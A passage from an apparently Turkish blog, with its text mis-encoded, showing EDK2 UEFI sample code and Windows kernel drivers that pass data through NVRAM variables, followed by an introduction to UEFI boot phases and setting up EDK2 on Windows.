\u0026ContentOfVariable ); if (EFI_ERROR(Status)) { Print(L\"Write Operation Failed!\\n\"); return Status; } Print(L\"The content successfully written!\\n\"); return EFI_SUCCESS; } Kodda ContentOfVariableâ€™Ä±n iÃ§eriÄŸini yazdÄ±k. Ã–ncelikle UEFI deÄŸiÅŸkenimiz iÃ§in bir deÄŸiÅŸken adÄ±, GUID ve deÄŸer oluÅŸturduk, ardÄ±ndan SetVariableâ€™Ä± Ã§alÄ±ÅŸtÄ±rdÄ±k. Bu iÅŸlemler sonucunda UEFI DeÄŸiÅŸkenimiz ÅŸu bilgilere sahip olacaktÄ±r:\nUEFI DeÄŸiÅŸken AdÄ±: MyUEFIVar GUID: A1B2C3D4-1234-5678-9ABC-DEF123456789 Ä°Ã§erik: 0xDEADBEEF Ä°ÅŸte sonuÃ§:\nÅimdi bu bilgilerle bu deÄŸiÅŸkene eriÅŸebiliriz.\n2 - GetVariable() GetVariable() servisi ilgili deÄŸiÅŸkenin iÃ§eriÄŸini okur. Ä°ÅŸte servisin parametreleri:\ntypedef EFI_STATUS GetVariable ( IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, OUT UINT32 *Attributes OPTIONAL, IN OUT UINTN *DataSize, OUT VOID *Data OPTIONAL ); Åimdi GetVariable servisi ile projeyi geliÅŸtirelim:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"MyUEFIVar\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; UINT8 ContentOfVariable[4] = { 0xDE, 0xAD, 0xBE, 0xEF }; UINTN DataSize = sizeof(ContentOfVariable); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eSetVariable( VariableName, \u0026VendorGuid, Attributes, DataSize, \u0026ContentOfVariable ); if (EFI_ERROR(Status)) { Print(L\"Failed to write!\\n\"); return Status; } Print(L\"The content successfully written!\\n\"); UINT8 Content[4] = { 0 }; DataSize = sizeof(Content); Status = gRT-\u003eGetVariable( VariableName, \u0026VendorGuid, \u0026Attributes, \u0026DataSize, \u0026Content ); if (EFI_ERROR(Status)) { Print(L\"Failed to read the variable!\\n\"); return Status; } for (int x = 0; x \u003c DataSize; x++) { Print(L\"Content: 0x%02x\\n\", Content[x]); } return EFI_SUCCESS; } SetVariable Ã§aÄŸrÄ±ldÄ±ktan sonra, UEFI DeÄŸiÅŸkenimizin iÃ§eriÄŸini almak iÃ§in GetVariable servisini Ã§aÄŸÄ±rdÄ±k ve ardÄ±ndan sonucu yazdÄ±rdÄ±k. Ä°ÅŸte sonuÃ§:\nCoding Windows Driver Esasen ntoskrnlâ€™de amacÄ±mÄ±z iÃ§in kullanabileceÄŸimiz bir rutin var. ExGetFirmwareEnvironmentVariable UEFI DeÄŸiÅŸkenlerini okumak iÃ§in kullanÄ±labilir. BÃ¶ylece windows sÃ¼rÃ¼cÃ¼sÃ¼nÃ¼n kodlanmasÄ± zor olmayacaktÄ±r. Bu rutini UEFI DeÄŸiÅŸken bilgisi ile Ã§aÄŸÄ±rabiliriz:\n#include \u003cntddk.h\u003e NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrint(\"Driver unloaded.\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; UNICODE_STRING VariableName = RTL_CONSTANT_STRING(L\"MyUEFIVar\"); UINT8 Content[4] = { 0 }; ULONG BufferSize = sizeof(Content); GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; NTSTATUS Status = STATUS_SUCCESS; Status = ExGetFirmwareEnvironmentVariable(\u0026VariableName, \u0026VendorGuid, \u0026Content, \u0026BufferSize, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Read Data!\\n\"); return Status; } for (ULONG x = 0; x \u003c BufferSize; x++) { DbgPrintEx(0, 0, \"The value from UEFI Variable: 0x%02x\\n\", Content[x]); } return STATUS_SUCCESS; } Projede ExGetFirmwareEnvironmentVariable rutini ile UEFI DeÄŸiÅŸkenimizin iÃ§eriÄŸine eriÅŸtik. Ä°ÅŸte sonuÃ§:\nExGetFirmwareEnvironmentVariable Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, aÅŸaÄŸÄ±daki rutinler Ã§aÄŸÄ±rÄ±lmakta:\nHer ÅŸeyden Ã¶nce ExpGetFirmwareEnvironmentVariable iÃ§in Ã§aÄŸrÄ± yapar:\nVe sonra ExGetFirmwareEnvironmentVariable parametreleri IoGetEnvironmentVariableExâ€™e aktarÄ±lÄ±r:\nCreating UEFI Variable from Windows Driver AyrÄ±ca Windows SÃ¼rÃ¼cÃ¼sÃ¼nden UEFI DeÄŸiÅŸkeni oluÅŸturabilir ve ayarlayabiliriz. ExSetFirmwareEnvironmentVariable bu amaÃ§ iÃ§in kullanÄ±labilir:\n#include \u003cntddk.h\u003e #pragma warning(disable: 4057) #define EFI_VARIABLE_NON_VOLATILE 0x00000001 #define EFI_VARIABLE_BOOTSERVICE_ACCESS 0x00000002 #define EFI_VARIABLE_RUNTIME_ACCESS 0x00000004 NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver unloaded.\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; UNICODE_STRING VariableName = RTL_CONSTANT_STRING(L\"YUPIIIIIII\"); WCHAR Buffer[] = L\"HELLOOO from Windows!!\"; ULONG BufferSize = sizeof(Buffer); GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; NTSTATUS Status = STATUS_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = ExSetFirmwareEnvironmentVariable(\u0026VariableName, \u0026VendorGuid, \u0026Buffer, BufferSize, Attributes); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to write the value! Error Code: 0x%x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Done!\\n\"); return STATUS_SUCCESS; } Ve UEFI sÃ¼rÃ¼cÃ¼sÃ¼:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"YUPIIIIIII\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; CHAR16 Buffer[32]; UINTN DataSize = sizeof(Buffer); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eGetVariable(VariableName, \u0026VendorGuid, \u0026Attributes, \u0026DataSize, \u0026Buffer); if (EFI_ERROR(Status)) { Print(L\"Failed to read the data!\\n\"); return Status; } Print(L\"The Content: %s\\n\", Buffer); return EFI_SUCCESS; } Ä°ÅŸte sonuÃ§:\nConclusion Bu dÃ¶kÃ¼manda, UEFI ve Windows sÃ¼rÃ¼cÃ¼lerinin NVRAM deÄŸiÅŸkenlerini kullanarak birbirleriyle nasÄ±l iletiÅŸim kurabileceÄŸini gÃ¶sterdik. UEFIâ€™de SetVariable ve GetVariable ve Windowsâ€™ta ExGetFirmwareEnvironmentVariable / ExSetFirmwareEnvironmentVariableâ€™dan yararlanarak, iki ortam arasÄ±nda kalÄ±cÄ± ve gÃ¼venilir bir veri kanalÄ± kurduk.\nBu yÃ¶ntem, geliÅŸtiricilerin Ã¼rÃ¼n yazÄ±lÄ±mÄ± ve iÅŸletim sistemi arasÄ±nda sorunsuz entegrasyonlar oluÅŸturmasÄ±na olanak tanÄ±yarak yeniden baÅŸlatmalarda esnek yapÄ±landÄ±rmalara, Ã¶zellik geÃ§iÅŸlerine veya telemetri mekanizmalarÄ±na izin verir.\nReferences UEFI.org - Runtime Services\nTianoCore Docs - GetVariable() and SetVariable()"},"title":"UEFI to Windows Communication via NVRAM Variables"},"/tr/docs/uefi-dev/uefi-introduction/":{"data":{"":"","hello-uefi-world#\u003cstrong\u003eHello UEFI World!\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar efenimm. UEFI Developmentâ€™Ä±n ilk bu dÃ¶kÃ¼manÄ±nda UEFI konusuna teorik olarak giriÅŸ yapacaÄŸÄ±z.\nDÃ¼n gece boÅŸ boÅŸ duvara bakma aktivemi gerÃ§ekleÅŸtirirken â€œhayatÄ±mÄ± daha da nasÄ±l mahvedebilirimâ€ diye dÃ¼ÅŸÃ¼nÃ¼rken aklÄ±ma UEFI Developmentâ€™a giriÅŸmek aklÄ±ma geldi. GerÃ§ekten uzun zamandÄ±r ilgilenmek istediÄŸim bir alandÄ± ve hayatÄ±mÄ± daha derine ve kÃ¶tÃ¼ye gÃ¶tÃ¼rmek iÃ§in efsane bir fÄ±rsat olduÄŸunu dÃ¼ÅŸÃ¼nerek ÅŸuan bu blogu yazÄ±yorum.\nUEFI Nedir? Direkt olarak kodlamaya giriÅŸmek olmaz. BazÄ± temel ÅŸeyleri Ã¶ÄŸrenmemiz gerekecek.\nKabaca bizim hayatÄ±mÄ±zÄ± mahvedecek bu UEFI (Unified Extensible Firmware Interface), bir bilgisayarÄ±n firmwareâ€™i iÃ§in bir spesifikasyondur. UEFI bir BilgisayarÄ±n gÃ¼Ã§ tuÅŸuna basÄ±ldÄ±ÄŸÄ± ilk sÃ¼reÃ§lerde UEFI, iÅŸletim sistemi baÅŸlatÄ±lmadan Ã¶nce Ã§alÄ±ÅŸÄ±r.\nUEFI dediÄŸimiz bu ÅŸeyi eski BIOS sistemin geliÅŸtirilmiÅŸ hali olduÄŸunu dÃ¼ÅŸÃ¼nebiliriz. UEFI modelleri ayrÄ±ca donanÄ±ma etkileÅŸim iÃ§in temel I/O sistemlerine de sahiptir ancak sistem Ã¶nyÃ¼kleme iÅŸlemleri farklÄ±dÄ±r. UEFI GPT (Guid Partition Table) kullanÄ±r. GPT, bir bilgisayarÄ±n depolama cihazÄ±ndaki bÃ¶lÃ¼mlerin dÃ¼zenini belirleyen ve modern yapÄ±sÄ± olan bir standarttÄ±r. Hepimizin bildiÄŸi HDD veya SSD gibi cihazlarda kullanÄ±lan standarttÄ±r. BIOSâ€™un yerini alan UEFI gibi, GPT ise de Ã¶nceden kullanÄ±lan MBR (Master Boot Record) bÃ¶lÃ¼mleme tablosunun yerini almÄ±ÅŸtÄ±r. GPT ile UEFI uyumlu Ã§alÄ±ÅŸÄ±r.\nUEFI ve GPT birleÅŸtirdiÄŸimizde elde edilen avantajlar ÅŸu ÅŸekildedir:\n2TB veya daha bÃ¼yÃ¼k diskleri desteklemek Daha hÄ±zlÄ± Booting Ä°ÅŸlemi Eski BIOSâ€™a kÄ±yasla daha da basitleÅŸtirilmiÅŸ geliÅŸtirme sunma Gibi ÅŸeyler vs. Yani UEFI ve GPTâ€™nin eski sistemlere kÄ±yasla daha avantaj sunduÄŸunu gÃ¶rebiliriz.\nUEFIâ€™in BIOS ile aynÄ± gÃ¶revleri vardÄ±r: I/O cihazlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak ve kontrolÃ¼ OSâ€™a aktarmak. Fakat gÃ¶revi sadece bununla sÄ±nÄ±rlÄ± kalmayÄ±p ve yukarÄ±da anlattÄ±ÄŸÄ±m gibi, aynÄ± zamanda iÅŸletim sistemi Ã¶ncesi yani pre-OS geliÅŸtirme iÃ§in geniÅŸ bir yelpaze sunar.\nAÅŸaÄŸÄ±da gÃ¶sterilen Legacy BIOS ve UEFI arasÄ±ndaki farkÄ± gÃ¶steren ÅŸemaya gÃ¶z atalÄ±m:\nÅemaya gÃ¶z attÄ±ÄŸÄ±mÄ±zda BIOS, donanÄ±m ile doÄŸrudan iletiÅŸim kuran bir firmware ve aynÄ± zamanda bir donanÄ±mdÄ±r. Åemadan UEFIâ€™ye gÃ¶z attÄ±ÄŸÄ±mÄ±zda donanÄ±m ile iÅŸletim sisteminin arasÄ±ndaki arayÃ¼zÃ¼ birleÅŸtirdiÄŸini gÃ¶rebiliriz. UEFIâ€™nin bu iÅŸlevi, geliÅŸtiriciler iÃ§in kolaylÄ±k saÄŸlar.\nKÄ±sacasÄ± UEFIâ€™ye gÃ¶z attÄ±ÄŸÄ±mÄ±zda GPT ile beraber eski Legacy BIOSâ€™a kÄ±yasla daha modern ve hÄ±zlÄ± bir sÃ¼reÃ§ sunduÄŸunu gÃ¶rmemiz mÃ¼mkÃ¼n.\nUEFI Ã–nyÃ¼kleme SÃ¼reci UEFI bir bilgisayarÄ±n gÃ¼Ã§ tuÅŸuna bastÄ±ktan sonrasÄ±nda logo gÃ¶rÃ¼lmeden Ã¶nce arka planda neler gerÃ§ekleÅŸtiÄŸine bir de yakÄ±ndan gÃ¶z atalÄ±m.\nUEFI, platformun baÅŸlatÄ±lmasÄ± sÃ¼recinde kritik Ã¶neme sahip altÄ± ana Ã¶nyÃ¼kleme aÅŸamasÄ±na sahiptir:\nSecurity (SEC): Security aÅŸamasÄ±, UEFI Ã¶nyÃ¼kleme sÃ¼recin ilk aÅŸamasÄ±dÄ±r. Genel amacÄ± ise GeÃ§ici Bellek Deposunu baÅŸlatmak, Sistemde root of trust olarak hareket etmek ve Pre-EFI Ã§ekirdek aÅŸamasÄ±na bilgi saÄŸlamaktÄ±r. Bahsi geÃ§en Root of Trust ise tam olarak ÅŸÃ¶yledir: SEC mekanizmasÄ± ayrÄ±ca PIâ€™da Ã§alÄ±ÅŸtÄ±rÄ±lan herhangi bir kodun dijital olarak imzalanmasÄ±nÄ± saÄŸlayan ve â€˜Secure Bootâ€™ ortamÄ± yaratan bir mekanizma olarak da iÅŸlev gÃ¶rÃ¼r.\nPre-EFI Initialization (PEI): Ä°kinci aÅŸamada, EFI kodunun Ã§alÄ±ÅŸmasÄ± saÄŸlanÄ±r. Ana gÃ¶revi ise bir sonraki aÅŸama olan ve DXE sÃ¼rÃ¼cÃ¼lerini baÅŸlatacak olan DXE Foundationâ€™Ä± indirmektir. AyrÄ±ca iÅŸlemci kaynaklarÄ±nÄ± kullanarak Pre-EFI Initialization Modules (PEIM)â€™leri dispatch etmekten sorumludur. Bu PEIMâ€™ler, bazÄ± kalÄ±cÄ± bellek tamamlayÄ±cÄ±larÄ±nÄ±n baÅŸlatÄ±lmasÄ± gibi kritik sÃ¼reÃ§lerden sorumlu olduÄŸu gibi bir sonraki aÅŸama olan Driver Execution Environment (DXE)â€™e geÃ§iÅŸi saÄŸlar.\nDriver Execution Environment (DXE): Bu aÅŸamanÄ±n gerÃ§ekten Ã¶nemli olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼yorum Ã§Ã¼nkÃ¼ sistemi baÅŸlatmak iÃ§in gerekli bÃ¼yÃ¼k iÅŸlemler burada gerÃ§ekleÅŸiyor. Bir Ã¶nceki aÅŸamada olan PEIâ€™de, DXEâ€™nin Ã§alÄ±ÅŸmasÄ± iÃ§in gereken bellek tahsis edilir ve baÅŸlatÄ±lÄ±r. ArtÄ±k kontroller DXEâ€™e aktarÄ±lmasÄ±yla DXE Dispatcher Ã§aÄŸÄ±rÄ±lÄ±r. Bu Dispatcher, donanÄ±m sÃ¼rÃ¼cÃ¼lerini, runtime hizmetlerini ve iÅŸletim sisteminin baÅŸlamasÄ± iÃ§in gereken tÃ¼m Ã¶nyÃ¼kleme hizmetlerini yÃ¼klemesinden ve yÃ¼rÃ¼tmesinden sorumludur. AmacÄ±mÄ±zÄ± dÃ¼ÅŸÃ¼nÃ¼rsek, Ã¶nceden dediÄŸim gibi burasÄ± bizim iÃ§in Ã¶nemli bir aÅŸamadÄ±r. Ã‡Ã¼nkÃ¼ geliÅŸtireceÄŸimiz sÃ¼rÃ¼cÃ¼ burada Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r.\nBoot Device Selection (BDS): DXE sÃ¼rÃ¼cÃ¼leri Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± ardÄ±ndan kontrol, muhtemelen hepinizin gÃ¶rdÃ¼ÄŸÃ¼ BSDâ€™ye aktarÄ±lÄ±r. Bu aÅŸamada ise iÅŸletim sistemi yÃ¼kleyicisinin hangi aygÄ±tta aranacaÄŸÄ±na dair bir seÃ§im yapÄ±lÄ±r. ArdÄ±ndan iÅŸletim sistemi yÃ¼klenmeye baÅŸlanÄ±r ve Transient System Load (TSL) aÅŸamasÄ±na geÃ§iÅŸ iÃ§in hazÄ±rlanÄ±lÄ±r.\nTransient System Load (TSL): Bu aÅŸamada, seÃ§ilen Ã¶nyÃ¼kleme yÃ¼kleyicisinin Ã§alÄ±ÅŸtÄ±ÄŸÄ± ve UEFI Ã¶nyÃ¼kleme hizmetlerinin sonlandÄ±rÄ±ldÄ±ÄŸÄ± aÅŸamadÄ±r.\nRuntime (RT): Bu aÅŸamada ise artÄ±k UEFIâ€™nin akÄ±ÅŸÄ± iÅŸletim sistemine devrediliyor. Fakat UEFI bu kÄ±sÄ±mdan itibaren tamamen ortadan kaybolduÄŸu anlamÄ±na gelmez. UEFIâ€™ye ait olan Runtime Services (Runtime Hizmetleri) iÅŸletim sistemini desteklemek iÃ§in kullanÄ±labilir durumda kalmaya devam eder. Bu Runtime hizmetleri, donanÄ±mla ilgili bazÄ± Ã¶zel iÅŸler iÃ§in System Management Mode (SMM) devreye girer. SMM, iÅŸlemcinin kritik donanÄ±m iÅŸlevlerini iÅŸletim sisteminden baÄŸÄ±msÄ±z olarak yÃ¶nettiÄŸi gÃ¼venli bir moddur. Ã–rneÄŸin, fan hÄ±zÄ±nÄ±n ayarlanmasÄ± veya batarya durumunun izlenmesi gibi iÅŸlemler bu modda yapÄ±lÄ±r. EÄŸer Ä°ÅŸletim sistemi, donanÄ±mla ilgili bir iÅŸi kendi baÅŸÄ±na yapamazsa, SMI (System Management Interrupt) adÄ± verilen bir sinyal gÃ¶nderir. Bu, â€œyardÄ±m Ã§aÄŸrÄ±sÄ±â€ gibidir. Ã–rneÄŸin, iÅŸletim sistemi fan hÄ±zÄ±nÄ± kontrol etmek istediÄŸinde bir SMI gÃ¶nderir, SMM devreye girer ve bu iÅŸi halleder.\nUEFI Developmentâ€™a GiriÅŸ Gelelim Ã¶nemli bu kÄ±sma.\nSÃ¶z konusu UEFI Development iÃ§in kaynak olduÄŸunda gerÃ§ekten bu sÃ¼reÃ§te kaynaklarÄ±n kÄ±sÄ±tlÄ± olduÄŸunu gÃ¶receksiniz. PopÃ¼ler olarak Development sÃ¼recinde, aÅŸaÄŸÄ±da sÄ±ralanan araÃ§lar kullanÄ±labilir:\nEDK2: EDK2, UEFI ve PI spesifikasyonlar iÃ§in modern, zengin ve platformlar arasÄ± kodlama gibi Ã¶zelliklerine sahip bir araÃ§tÄ±r. EDK2 projesi, UEFI spesifikasyonuna katkÄ±da bulunan geliÅŸtiricilerin birÃ§oÄŸu tarafÄ±ndan (topluluk gÃ¶nÃ¼llÃ¼leriyle birlikte) geliÅŸtirilmekte ve gÃ¼nÃ¼mÃ¼zde sÃ¼rdÃ¼rÃ¼lmektedir. Bu blog sÃ¼recinde ise kodlamayÄ± bununla yapacaÄŸÄ±z. EDK2â€™nin en son UEFI protokollerini iÃ§erdiÄŸinden bu araÃ§ son derece yararlÄ±dÄ±r. Buna ek olarak, Ã¶ÄŸrenme sÃ¼recinde rehber olarak kullanabileceÄŸimiz projeler Ã§ok fazladÄ±r.\nVisualUEFI VisualUEFI aracÄ±, Windows kullanÄ±cÄ±larÄ± iÃ§in Visual Studio IDE ile EDK2 projeleri geliÅŸtirmesine imkan veren bir araÃ§tÄ±r. EDK2 projesinin karmaÅŸÄ±k dÃ¼zeninden kurtulmak ve rahat bir ÅŸekilde Ã§alÄ±ÅŸmak isterseniz bu aracÄ± tercih edebilirsiniz. Windows kullanÄ±cÄ±sÄ± olsam da bu blog sÃ¼recinde VisualUEFIâ€™ye yer vermeyeceÄŸim. VisualUEFI kodlama iÃ§in rahat bir ortam sunsa da, benim iÃ§in EDK2 gibi projelerin dÃ¼zenini manuel olarak uÄŸraÅŸmak daha rahat oluyor. EÄŸer VisualUEFIâ€™yi kurmak isterseniz internette birÃ§ok kaynak bulunmakta.\nProjelerimizi geliÅŸtirdikten sonra bunlarÄ± simÃ¼le etmemiz gerekecek. Bunun iÃ§in aÅŸaÄŸÄ±dakilerden biri kullanÄ±labilir:\nQEMU: QEMUâ€™nun zaten ne olduÄŸunu biliyorsunuzdur. Bir sanal makineden ziyade bir emÃ¼latÃ¶r olmasÄ± nedeniyle iyi bir debugging olanaklarÄ±nÄ± saÄŸlayan Ã§ok platformlu bir emÃ¼latÃ¶r. Linux veya Windows ortamÄ±nda bunu tercih edebilirsiniz.\nVMWare / VirtualBox: Vmware, VirtualBox gibi sanal makineleri de tercih edebilirsiniz.\nBu sÃ¼reÃ§te ise simÃ¼le iÃ§in VMWareâ€™i tercih edeceÄŸim. Ã–zellikle VMwareâ€™in doÄŸru Ã§alÄ±ÅŸan NVRAM emÃ¼lasyonu ile iyi performans sunar. Benim iÃ§in en Ã¶nemli sunduÄŸu Ã¶zellik ise Windowsâ€™ta TSL ve RT aÅŸamalarÄ±nda debugging iÃ§in WinDbg ile gÃ¼zel Ã§alÄ±ÅŸmasÄ±.\nWindowsâ€™ta EDK2â€™nin Kurulumu EDK2 projesini kurmadan Ã¶nce aÅŸaÄŸÄ±daki araÃ§larÄ± kurmamÄ±z lazÄ±m:\nGit Python NASM Visual Studio Ã–ncelikle git indirelim ve ardÄ±ndan Pythonâ€™u indirelim. Pythonâ€™u Microsoft Store yerine direkt olarak orijinal sitesinden indirin ve kurulumda ise aÅŸaÄŸÄ±da gÃ¶sterilene dikkat edin:\nFotoÄŸrafta gÃ¶sterilmiÅŸ alandaki kutucuklarÄ± iÅŸaretlemeyi unutmayÄ±n.\nDaha sonra NASMâ€™Ä± orijinal sitesinden indirelim ve indirdiÄŸimiz .exe dosyasÄ±nÄ± yÃ¶netici ile Ã§alÄ±ÅŸtÄ±ralÄ±m:\nKurulum esnasÄ±nda NASM projesinin lokasyonunu C:\\NASM olarak ayarlayalÄ±m.\nNASM kurulumundan sonra ise Windowsâ€™un Enviroment Variables ayarÄ±ndan User Variables iÃ§in NASM_PREFIX adÄ±nda bir deÄŸiÅŸken oluÅŸturalÄ±m:\nDeÄŸeri C:\\NASM\\ olarak ayarlayalÄ±m.\nDaha sonra Visual Studioâ€™nÄ±n C++ araÃ§larÄ±nÄ± kurmamÄ±z gerekecek. Bu araÃ§larÄ± indirmek iÃ§in Downloads sayfasÄ±ndan Build Tools aramasÄ± yapalÄ±m:\nTools for Visual Studio olanÄ± indirelim ve ardÄ±ndan:\nKurulumda Desktop Development with C++ olanÄ± seÃ§elim ve kurulumu baÅŸlatalÄ±m.\nBunlarÄ± tamamladÄ±ktan sonra cmd.exe aÃ§alÄ±m ve edk2 projesini kuralÄ±m:\ngit clone https://github.com/tianocore/edk2.git cd edk2 git submodule update --init edk2 projesini de indirdikten sonra Developer Command Prompt VS 2022 aracÄ±nÄ± aÃ§alÄ±m ve daha sonra indirdiÄŸimiz edk2 projesine gidelim. Config/target.txtâ€™i notepad ile aÃ§alÄ±m:\nnotepad Conf\\target.txt Bu .txt iÃ§erisinde, aÅŸaÄŸÄ±da size gÃ¶sterdiÄŸim deÄŸerler ile deÄŸiÅŸtirin:\nACTIVE_PLATFORM = ShellPkg/ShellPkg.dsc ... TARGET = RELEASE ... TARGET_ARCH = X64 ... TOOL_CHAIN_TAG = VS2022 Aynen bÃ¶yle olacak ÅŸekilde deÄŸerleri deÄŸiÅŸtirin ve kaydedip kapatabilirsiniz. Daha sonra edksetup.batâ€˜Ä± Ã§alÄ±ÅŸtÄ±ralÄ±m:\n\u003e C:\\edk2\u003eedksetup.bat ... WORKSPACE = C:\\edk2 EDK_TOOLS_PATH = C:\\edk2\\BaseTools BASE_TOOLS_PATH = C:\\edk2\\BaseTools EDK_TOOLS_BIN = C:\\edk2\\BaseTools\\Bin\\Win32 CONF_PATH = C:\\edk2\\Conf PYTHON_COMMAND = py -3 PYTHONPATH = C:\\edk2\\BaseTools\\Source\\Python; !!! WARNING !!! NASM_PREFIX environment variable is not set Found nasm.exe, setting the environment variable to C:\\nasm\\ !!! WARNING !!! CLANG_BIN environment variable is not set !!! WARNING !!! No CYGWIN_HOME set, gcc build may not be used !!! Daha sonra araÃ§larÄ± derlemek iÃ§in BaseTools dizinine gidelim:\n\u003e C:\\edk2\u003ecd BaseTools \u003e C:\\edk2\\BaseTools\u003enmake AraÃ§larÄ± derledikten sonra tekrar ana dizine dÃ¶nelim ve Build komutunu Ã§alÄ±ÅŸtÄ±ralÄ±m:\n\u003e C:\\edk2\\BaseTools\u003ecd .. \u003e C:\\edk2\u003eBuild ... - Done - Build end time: 13:14:44, Jan.28 2025 Build total time: 00:02:03 Derlemeden sonra Done Ã§Ä±ktÄ±sÄ±nÄ± almamÄ±z gerekiyor.\nHello UEFI World! ArtÄ±k UEFI sÃ¼rÃ¼cÃ¼sÃ¼ geliÅŸtirmek iÃ§in gerekli her ÅŸeye sahibiz. Programlama geleneÄŸine uygun davranarak â€œHello UEFI Worldâ€ Ã§Ä±ktÄ±sÄ± veren basit bir proje geliÅŸtirelim. GeliÅŸtireceÄŸimiz projeleri ShellPkg/Application dizin altÄ±nda oluÅŸturabiliriz.\nBir sÃ¼rÃ¼cÃ¼ geliÅŸtirirken .c projesinin olmasÄ± yanÄ± sÄ±ra bir de .inf dosyasÄ± oluÅŸturmamÄ±z gerekiyor. Bu INF dosyasÄ±, modÃ¼lÃ¼ oluÅŸturmak ve paketlemek iÃ§in gerekli bilgileri saÄŸlar. Yani sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼n paketlenmesi iÃ§in gerekli bilgiler saÄŸlayacaÄŸÄ±z.\nedk2/ShellPkg/Application dizini altÄ±nda HelloWorld adÄ±nda bir klasÃ¶r oluÅŸturalÄ±m ve ardÄ±ndan HelloWorld.c projemizi kodlamaya baÅŸlayalÄ±m:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e EFI_STATUS EFIAPI UefiMain ( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable ) { Print (L\"Hello UEFI World!\\n\"); return EFI_SUCCESS; } BazÄ± detaylar haricinde kodlar bizlere yabancÄ± gelmeyecektir.\nMain fonksiyon iÃ§in kodlamalarÄ±mÄ±zÄ± UefiMain iÃ§erisinde yapacaÄŸÄ±z. UefiMain, UEFI sÃ¼rÃ¼cÃ¼lerin baÅŸlangÄ±Ã§ noktasÄ±dÄ±r. Geleneksel main fonksiyonuna benzer ÅŸekilde, bir UEFI uygulamasÄ±nÄ±n giriÅŸ noktasÄ±dÄ±r. UefiMain iki parametre alÄ±r:\nImageHandle: UygulamanÄ±n UEFI firmware tarafÄ±ndan temsil edilen benzersiz bir tanÄ±mlayÄ±cÄ±sÄ±dÄ±r.\nSystemTable: UEFI sisteminde tanÄ±mlanan Ã§eÅŸitli hizmetlere ve tablolara eriÅŸim saÄŸlayan bir veri yapÄ±sÄ±dÄ±r.\nKodlara biraz detaylÄ± gÃ¶z attÄ±ÄŸÄ±nÄ±zda tÄ±pkÄ± benim gibi syntaxâ€™Ä±n farklÄ±lÄ±ÄŸÄ± yÃ¼zÃ¼nden eliniz ayaÄŸÄ±nÄ±z titremiÅŸ olabilir (Ã¶rneÄŸin Ã§aÄŸÄ±rÄ±lan Print ile parantez arasÄ±na boÅŸluk bÄ±rakÄ±lmasÄ± vs). Ä°lk baÅŸta benim gibi hatalÄ± bir syntax olduÄŸunu dÃ¼ÅŸÃ¼nseniz de hatalÄ± deÄŸil. Bu EDK2 topluluÄŸuna ait C kodu tipiyle alakalÄ±dÄ±r:\nÄ°lgili blogta syntax kurallarÄ±na gÃ¶z atabilirsiniz. AklÄ±nÄ±zda bulunsun eÄŸer ileride edk2 projesine katkÄ±da bulunursanÄ±z bu syntax kuralÄ±na dikkat edin. Madem edk2â€™den yararlanacaÄŸÄ±z kurallarÄ±na uyalÄ±m deÄŸil mi?\nDaha sonra HelloWorld.inf 